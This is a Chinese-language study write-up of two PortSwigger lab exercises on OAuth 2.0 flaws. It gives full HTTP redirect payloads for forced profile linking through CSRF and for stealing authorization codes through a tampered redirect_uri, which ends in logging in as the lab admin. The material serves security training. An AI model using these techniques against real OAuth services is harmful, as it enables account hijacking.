---
title: OAuth 2.0 authentication vulnerabilities
description: OAuth 2.0 authentication vulnerabilities
last_update:
  date: "2025-09-16T08:00:00+08:00"
---

<!-- 看到這 https://portswigger.net/web-security/oauth#oauth-authentication -->

## Lab: Forced OAuth profile linking

| Dimension | Description                                                                       |
| --------- | --------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/oauth#flawed-csrf-protection                 |
| Lab       | https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking |

這題需要使用 Burp Suite 的 Intercept，因為綁定 Social Media 到 Client App 只有一次機會

看到 https://0a8e007d049cf42e80b012da009800ee.web-security-academy.net/oauth-linking?code=RhrOkIHwCimQsT0dm8U6LpbM-nKCeQH0zt9KBDosfU- 的時候，請把這個 Request Drop 掉

之後在 exploit-server 構造

```
HTTP/1.1 302 Moved Permanently
Content-Type: text/html; charset=utf-8
Location: https://0a8e007d049cf42e80b012da009800ee.web-security-academy.net/oauth-linking?code=RhrOkIHwCimQsT0dm8U6LpbM-nKCeQH0zt9KBDosfU-
```

受害者在 Client App 登入的情況點擊連結，就會把攻擊者的 Social Media 跟受害者的 Clieny App 帳號綁定

## Lab: OAuth account hijacking via redirect_uri

| Dimension | Description                                                                              |
| --------- | ---------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens |
| Lab       | https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri  |

在 exploit-server 構造

```
HTTP/1.1 302 Moved Permanently
Content-Type: text/html; charset=utf-8
Location: https://oauth-0a04008a03e7f89981d3ece602ad0020.oauth-server.net/auth?client_id=jrmnw2fbwsqv486hokfhp&redirect_uri=https://exploit-0a29002c03a3f832817ded3c01ea0003.exploit-server.net&response_type=code&scope=openid%20profile%20email
```

並且點選 "Deliver exploit to victim"，之後點選 "Access log"，就可以看到 `/?code=ADzZw2MustwUWOTkQRH8HQxFst6AR3yh9Lq46FhEWuj`

瀏覽器直接訪問 https://0a3c004103aff8dd8163eeb00095006c.web-security-academy.net/oauth-callback?code=ADzZw2MustwUWOTkQRH8HQxFst6AR3yh9Lq46FhEWuj ，就可以成功登入受害者 (admin) 的帳密～

## 參考資料

- https://portswigger.net/web-security/oauth
